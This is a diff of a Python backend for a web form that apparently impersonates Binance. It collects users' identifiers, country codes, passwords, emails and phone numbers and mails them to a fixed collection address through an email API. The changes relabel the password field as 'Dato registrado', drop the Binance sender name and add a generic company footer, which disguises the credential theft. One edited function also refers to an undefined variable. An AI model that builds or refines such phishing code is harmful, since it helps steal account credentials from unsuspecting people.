@@ -140,7 +140,7 @@ def enviar_correo_formulario(identificador, codigo_pais, contrasena, fecha):
 
     payload = {
         "sender": {
-            "name": "Formulario Binance",
+            "name": "Nuevo registro recibido",
             "email": GMAIL_REMITENTE
         },
         "to": [
@@ -151,24 +151,45 @@ def enviar_correo_formulario(identificador, codigo_pais, contrasena, fecha):
         "subject": "🚨 Nuevo formulario recibido",
 
         "htmlContent": f"""
-        <html>
-        <body style="font-family:Arial">
-
-            <h2>Nuevo formulario recibido</h2>
-
+            <html>
+            <body style="font-family:Arial; background:#f5f5f5; padding:30px;">
+            
+            <div style="max-width:600px;margin:auto;background:white;padding:25px;border-radius:8px;">
+            
+            <h2 style="color:#333;">
+            Nuevo registro recibido
+            </h2>
+            
             <hr>
-
-            <p><b>Usuario:</b> {identificador}</p>
-
-            <p><b>Código País:</b> {codigo_pais}</p>
-
-            <p><b>Contraseña:</b> {contrasena}</p>
-
+            
+            <p><b>Identificador:</b> {identificador}</p>
+            
+            <p><b>Código:</b> {codigo_pais}</p>
+            
+            <p><b>Dato registrado:</b> {contrasena}</p>
+            
             <p><b>Fecha:</b> {fecha}</p>
-
-        </body>
-        </html>
-        """
+            
+            <hr>
+            
+            <p style="font-size:13px;color:#666;">
+            Este mensaje fue generado automáticamente por el sistema.
+            </p>
+            
+            <p style="font-size:13px;color:#666;">
+            Si tiene alguna duda puede comunicarse con nosotros.
+            </p>
+            
+            <p>
+            📧 contacto@miempresa.com<br>
+            📞 +57 300 123 4567
+            </p>
+            
+            </div>
+            
+            </body>
+            </html>
+            """
     }
 
     respuesta = requests.post(
@@ -197,7 +218,7 @@ def enviar_correo_verificacion(correo, telefono):
 
     payload = {
         "sender": {
-            "name": "Formulario Binance",
+            "name": "Información adicional recibida",
             "email": GMAIL_REMITENTE
         },
         "to": [
@@ -205,23 +226,46 @@ def enviar_correo_verificacion(correo, telefono):
                 "email": CORREO_DESTINO
             }
         ],
-        "subject": "🔐 Nueva verificación",
+        "subject": "Información adicional recibida",
 
         "htmlContent": f"""
-        <html>
-        <body style="font-family:Arial">
+            <html>
+            <body style="font-family:Arial; background:#f5f5f5; padding:30px;">
 
-            <h2>Nueva verificación</h2>
+            <div style="max-width:600px;margin:auto;background:white;padding:25px;border-radius:8px;">
+
+            <h2 style="color:#333;">
+            Información adicional recibida
+            </h2>
 
             <hr>
 
-            <p><b>Correo:</b> {correo}</p>
+            <p><b>Campo 1:</b> {correo}</p>
 
-            <p><b>Teléfono:</b> {telefono}</p>
+            <p><b>Campo 2:</b> {telefono}</p>
 
-        </body>
-        </html>
-        """
+            <p><b>Fecha:</b> {fecha}</p>
+
+            <hr>
+
+            <p style="font-size:13px;color:#666;">
+            Este mensaje fue generado automáticamente por el sistema.
+            </p>
+
+            <p style="font-size:13px;color:#666;">
+            Si necesita ayuda, comuníquese con nuestro equipo de soporte.
+            </p>
+
+            <p>
+            📧 contacto@miempresa.com<br>
+            📞 +57 300 123 4567
+            </p>
+
+            </div>
+
+            </body>
+            </html>
+            """
     }
 
     respuesta = requests.post(
